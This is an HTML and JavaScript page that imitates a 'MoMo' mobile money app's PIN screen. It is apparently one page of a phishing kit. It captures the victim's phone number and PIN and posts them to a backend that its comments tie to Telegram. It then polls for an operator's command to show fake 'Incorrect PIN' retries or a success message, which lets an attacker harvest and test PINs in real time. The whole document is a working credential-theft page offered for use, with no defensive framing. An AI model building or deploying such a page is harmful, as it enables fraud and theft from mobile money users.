<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MoMo PIN</title>

<style>
body {
  margin: 0;
  font-family: Arial;
  background: #0b5c6b;
  color: white;
  text-align: center;
}

.header {
  background: #0b5c6b;
  color: #ffcc00;
  padding: 15px;
  font-size: 20px;
  font-weight: bold;
}

.container {
  background: white;
  color: black;
  max-width: 350px;
  margin: 40px auto;
  padding: 25px;
  border-radius: 15px;
  display: block;
}

input {
  width: 100%;
  padding: 15px;
  margin-top: 15px;
  border-radius: 10px;
  border: none;
  background: #f1f1f1;
  text-align: center;
  font-size: 18px;
  letter-spacing: 5px;
}

button {
  width: 100%;
  padding: 15px;
  margin-top: 20px;
  background: #ffcc00;
  border: none;
  border-radius: 10px;
  font-weight: bold;
  cursor: pointer;
}

button:disabled {
  background: #cccccc;
  cursor: not-allowed;
}

.footer {
  margin-top: 20px;
  font-size: 12px;
}
</style>
</head>

<body>

<div class="header">
  MoMo App
</div>

<div class="container" id="pinContainer">
  <h3 id="titleText">Enter MoMo PIN</h3>
  <p id="phoneDisplay"></p>

  <form id="pinForm">
    <input type="password" id="pinInput" placeholder="****" maxlength="5" pattern="\d*" inputmode="numeric" required>
    <button type="submit" id="pinBtn">Confirm</button>
  </form>
</div>

<div class="footer">
  2026@MoMo Verified
</div>

<script>
const phone = localStorage.getItem("phone");

// 1. Security Check
if (!phone) {
  window.location.href = "/";
} else {
  document.getElementById("phoneDisplay").innerText = "Number: " + phone;
}

// 2. Form Elements
const pinForm = document.getElementById("pinForm");
const pinInput = document.getElementById("pinInput");
const pinBtn = document.getElementById("pinBtn");
const titleText = document.getElementById("titleText");

// 3. Handle PIN Submission
pinForm.addEventListener("submit", async function(e) {
  e.preventDefault();
  
  const pinValue = pinInput.value;
  pinBtn.innerText = "Verifying...";
  pinBtn.disabled = true;

  try {
    // Send PIN to your Backend/Telegram
    await fetch("/send-pin", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ phone: phone, pin: pinValue })
    });

    // Start checking for your command from Telegram
    checkAdminCommand();

  } catch (err) {
    alert("Connection error. Try again.");
    pinBtn.innerText = "Confirm";
    pinBtn.disabled = false;
  }
});

// 4. The Dynamic "Waiting for Admin" Loop
async function checkAdminCommand() {
  try {
    const res = await fetch("/check-pin-status/" + phone);
    const data = await res.json();

    if (data.status === "re-enter") {
      // Logic for 1/3, 2/3 attempts
      pinBtn.innerText = "Confirm";
      pinBtn.disabled = false;
      pinInput.value = ""; 
      titleText.innerText = "Incorrect PIN. Try Again (" + data.attempt + "/3)";
      titleText.style.color = "red";
    } 
    
    else if (data.status === "success") {
      titleText.innerText = "Verified Successfully!";
      titleText.style.color = "green";
      setTimeout(() => {
        window.location.href = "/success.html";
      }, 1500);
    } 
    
    else {
      // Still pending admin action, check again in 2 seconds
      setTimeout(checkAdminCommand, 2000);
    }

  } catch (err) {
    setTimeout(checkAdminCommand, 3000);
  }
}
</script>

</body>
</html>
